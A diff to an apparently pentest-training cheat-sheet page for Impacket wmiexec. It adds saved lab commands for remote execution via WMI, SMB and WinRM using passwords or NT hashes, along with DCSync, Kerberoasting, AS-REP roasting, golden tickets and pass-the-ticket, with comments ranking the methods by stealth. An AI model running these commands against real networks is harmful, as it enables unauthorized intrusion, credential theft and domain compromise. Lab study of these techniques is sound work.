@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=wmiexec) · [All tools](/index)
+
 ## Password (prompted)
 
 **Kali**
@@ -29,8 +31,184 @@ impacket-wmiexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=wmiexec)
+## Notebook recipes
 
-## Learning and original examples
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Windows remote execution by service](/tools/windows-remote-execution)
+<AccordionGroup>
+
+<Accordion title="Remote Access">
+
+### Remote Access
+
+**Active Directory Enumeration Commands**
+
+```bash
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+    # Connect to Windows through WinRM
+psexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Attempt remote command execution through SMB
+
+wmiexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Execute commands remotely through WMI
+```
+
+</Accordion>
+
+<Accordion title="4. Impacket Toolkit">
+
+### 4. Impacket Toolkit
+
+**Active Directory Enumeration from Linux**
+
+```bash
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+```
+
+</Accordion>
+
+<Accordion title="Original captured examples">
+
+### Original captured examples
+
+**Impacket: Script Quick Reference**
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+</Accordion>
+
+<Accordion title="Step 6 — Load the ticket and run tools through proxychains">
+
+### Step 6 — Load the ticket and run tools through proxychains
+
+**Pass the Ticket from Linux**
+
+```bash
+export KRB5CCNAME=/tmp/ticket/krb5cc_647401106_8Dt6uj   # full path to the file you pulled; no FILE: prefix
+klist                                        # confirm it loaded and is still valid
+
+proxychains impacket-wmiexec dc01 -k         # -k = use Kerberos; target by NAME, not IP
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+</Accordion>
+
+<Accordion title="Using Impacket With Kerberos">
+
+### Using Impacket With Kerberos
+
+**Pass the Ticket from Linux**
+
+```bash
+impacket-wmiexec dc01 -k -no-pass
+```
+
+</Accordion>
+
+<Accordion title="From SMB access to remote code execution">
+
+### From SMB access to remote code execution
+
+**SMB Enumeration and Shares**
+
+```bash
+impacket-psexec <user>:'<pass>'@<IP>             # SYSTEM shell (noisiest; drops a service binary)
+impacket-smbexec <user>:'<pass>'@<IP>            # semi-interactive, no binary dropped (quieter)
+impacket-wmiexec <user>:'<pass>'@<IP>            # over WMI, fileless (stealthiest)
+impacket-psexec -hashes :<NTLM_hash> <user>@<IP> # Pass-the-Hash variant
+```
+
+</Accordion>
+
+<Accordion title="Enumeration Workflow">
+
+### Enumeration Workflow
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```text
+1. Port scan → 3389, 5985, 5986, 135
+2. RDP open?   → nmap rdp* (hostname/domain/NLA) → rdp-sec-check.pl (encryption)
+3. WinRM open? → evil-winrm with found creds (or -H hash)
+4. WMI (135)?  → wmiexec.py with creds → stealthy command exec
+5. Got creds?  → try ALL three + test password reuse across hosts
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; execution">
+
+### Footprinting & execution
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```bash
+nmap -sV -sC <IP> -p135
+
+# Impacket wmiexec — command exec / semi-interactive shell
+wmiexec.py <user>:"<pass>"@<IP> "whoami"
+wmiexec.py <user>:"<pass>"@<IP>                 # interactive
+wmiexec.py -hashes :<NTLM_hash> <user>@<IP>     # pass-the-hash
+```
+
+</Accordion>
+
+<Accordion title="wmiexec.py">
+
+### wmiexec.py
+
+**Windows remote execution by service**
+
+```bash
+# Password prompt, then a semi-interactive command interface
+impacket-wmiexec 'example.local/administrator@192.0.2.10'
+
+# Single command, using an NT hash
+impacket-wmiexec -hashes ':NT_HASH' 'example.local/administrator@192.0.2.10' 'whoami'
+```
+
+</Accordion>
+
+<Accordion title="Windows Remote Access">
+
+### Windows Remote Access
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: WMI 135 Command execution wmiexec.py &lt;user>:&lt;pass>@&lt;IP> "cmd"
+
+```text
+wmiexec.py <user>:<pass>@<IP> "cmd"
+```
+
+</Accordion>
+
+<Accordion title="WMI (Windows Management Instrumentation)">
+
+### WMI (Windows Management Instrumentation)
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+Context from the notebook: WMI is Windows' built-in management framework — it can answer almost any question about a system (OS, processes, installed software, services) and  create processes remotely . Attackers love it because execution via WMI is  fileless and stealthy  (no service installed, blends into normal admin activity), which is why  wmiexec.py  is a favourite.
+
+```text
+wmiexec.py
+```
+
+</Accordion>
+
+</AccordionGroup>
